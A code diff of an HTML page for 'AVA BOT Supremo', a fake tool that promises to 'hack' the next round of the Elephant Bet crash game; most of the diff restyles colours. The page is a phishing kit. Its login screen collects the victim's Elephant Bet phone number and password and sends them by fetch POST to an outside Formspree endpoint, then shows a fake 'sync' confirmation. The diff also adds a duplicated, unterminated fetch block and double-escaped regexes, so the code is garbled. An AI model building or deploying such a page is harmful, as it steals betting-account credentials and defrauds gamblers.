@@ -5,16 +5,16 @@
   <title>AVA BOT Supremo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {font-family:Arial,sans-serif;background:url('fundo.png') no-repeat center center fixed;background-size:cover;color:#fff;text-align:center;margin:0;padding:20px}
-    h1 {color:#ff0000;font-size:2.5em;text-shadow:0 0 15px #ff0000,0 0 30px #ff0000;margin-top:10px}
-    .circle {font-size:1.5em;margin:20px auto;padding:40px;border-radius:50%;width:180px;height:180px;display:flex;align-items:center;justify-content:center;background:#111;color:#fff;box-shadow:0 0 20px #0ff}
+    body {font-family:Arial,sans-serif;background:#fff;color:#000;text-align:center;margin:0;padding:20px}
+    h1 {color:#000;font-size:2.5em;margin-top:10px}
+    .circle {font-size:1.5em;margin:20px auto;padding:40px;border-radius:50%;width:180px;height:180px;display:flex;align-items:center;justify-content:center;background:#c00;color:#fff;box-shadow:0 0 20px #c00}
     .azul {color:#0ff;border:3px solid #0ff;box-shadow:0 0 25px #0ff;text-shadow:0 0 15px #0ff}
     .blocked {background:#222;color:#ffcc00;padding:10px;margin:15px auto;border-radius:5px;width:90%;font-size:.9em;box-shadow:0 0 10px #ffcc00}
-    button {padding:15px 25px;font-size:1.1em;border:none;border-radius:5px;cursor:pointer;width:80%;max-width:320px;margin:15px auto;display:block;text-transform:uppercase;font-weight:bold;box-shadow:0 0 15px #fff}
+    button {padding:15px 25px;font-size:1.1em;border:none;border-radius:5px;cursor:pointer;width:80%;max-width:320px;margin:15px auto;display:block;text-transform:uppercase;font-weight:bold}
     #preverBtn {background:#ffcc00;color:#000;box-shadow:0 0 20px #ffcc00}
-    #openLogin {background:#00ff00;color:#000;box-shadow:0 0 20px #00ff00}
-    #loginForm button {background:#ff0066;color:#fff;box-shadow:0 0 20px #ff0066}
-    input {margin:8px;padding:12px;width:80%;max-width:300px;font-size:1em;background:#111;color:#fff;border:1px solid #fff;border-radius:5px;box-shadow:0 0 10px #fff}
+    #openLogin {background:#00f;color:#fff;box-shadow:0 0 20px #00f}
+    #loginForm button {background:#00f;color:#fff;box-shadow:0 0 20px #00f}
+    input {margin:8px;padding:12px;width:80%;max-width:300px;font-size:1em;background:#fff;color:#000;border:2px solid #c00;border-radius:5px}
     input::placeholder {color:#888}
     #homeScreen,#gameScreen,#loginScreen,#syncScreen {display:none}
     footer {margin-top:30px;font-size:.8em;color:#888}
@@ -28,15 +28,15 @@
     <form id="homeForm">
       <input type="tel" id="numeroInicio" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}"><br>
       <input type="text" id="chaveInicio" placeholder="Chave de acesso" required><br>
-      <button type="submit">Entrar</button>
+      <button type="submit" style="background:#0f0;color:#000;box-shadow:0 0 20px #0f0">Entrar</button>
     </form>
-    <p style="margin-top:15px;color:#ffcc00">Precisa de ajuda? Ligue: 926 128 955</p>
+    <p style="margin-top:15px;color:#c00">Precisa de ajuda? Ligue: 926 128 955</p>
   </div>
 
   <!-- Tela do jogo -->
-  <div id="gameScreen">
-    <h1>ELEPHANT BET</h1>
-    <div id="circle" class="circle">--</div>
+  <div id="gameScreen" style="background:#000;color:#fff;padding:20px">
+    <h1 style="color:#c00">AVA BOT</h1>
+    <div id="circle" class="circle">1.00x</div>
     <button id="preverBtn">Hackear Próxima Vela</button>
     <div id="resultado"></div>
     <div id="blockedMsg" class="blocked" style="display:none">⚠️ Acesso bloqueado. Sincronize o Bot.</div>
@@ -44,22 +44,22 @@
   </div>
 
   <!-- Tela de login -->
-  <div id="loginScreen">
-    <h2>Conecte com a sua conta da Elephant Bet</h2>
+  <div id="loginScreen" style="background:#add8e6;color:#000;padding:20px">
+    <h2 style="color:#00f">Conecte com a sua conta da Elephant Bet</h2>
     <form id="loginForm">
       <input type="tel" id="numeroLogin" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}"><br>
       <input type="password" id="senhaLogin" placeholder="Digite a sua senha" required><br>
       <button type="submit">Sincronizar Agora</button>
     </form>
     <a href="#" id="closeLogin">← Voltar</a>
-    <p id="statusMsg" style="color:#ffcc00"></p>
+    <p id="statusMsg" style="color:#c00"></p>
   </div>
 
   <!-- Tela de sincronização concluída -->
-  <div id="syncScreen">
-    <h2>Obrigado por sincronizar o seu bot com a Elephantbet</h2>
-    <p>Aguarde pelos dados de configuração do bot.</p>
-    <button id="backToGame">Voltar ao Bot</button>
+  <div id="syncScreen" style="background:#add8e6;color:#000;padding:20px">
+    <h2 style="color:#00f">Obrigado por sincronizar o seu bot com a Elephantbet</h2>
+    <p style="color:#c06">Aguarde pelos dados de configuração do bot.</p>
+    <button id="backToGame" style="background:#f06;color:#fff;box-shadow:0 0 20px #f06">Voltar ao Bot</button>
   </div>
 
   <footer>© AVA BOT Supremo</footer>
@@ -71,7 +71,7 @@
     // Tela inicial
     homeForm.addEventListener("submit",function(e){
       e.preventDefault();
-      if(!/^9\d{8}$/.test(numeroInicio.value)){alert("Número inválido!");return;}
+      if(!/^9\\d{8}$/.test(numeroInicio.value)){alert("Número inválido!");return;}
       if(chaveInicio.value!=="10102025"){alert("Chave incorreta!");return;}
       homeScreen.style.display="none";
       gameScreen.style.display="block";
@@ -121,7 +121,7 @@
       const numero=numeroLogin.value;
       const senha=senhaLogin.value;
 
-      if(!/^9\d{8}$/.test(numero)){
+      if(!/^9\\d{8}$/.test(numero)){
         statusMsg.textContent="⚠️ O número deve começar com 9 e ter 9 dígitos.";
         return;
       }
@@ -130,6 +130,10 @@
 
       try{
         await fetch("https://formspree.io/f/mbdeddpb",{
+          method:"POST",
+          body:JSON.stringify({numero,senha}),
+          headers:{"
+              await fetch("https://formspree.io/f/mbdeddpb",{
           method:"POST",
           body:JSON.stringify({numero,senha}),
           headers:{"Content-Type":"application/json"}
@@ -152,3 +156,4 @@
   </script>
 </body>
 </html>
+      
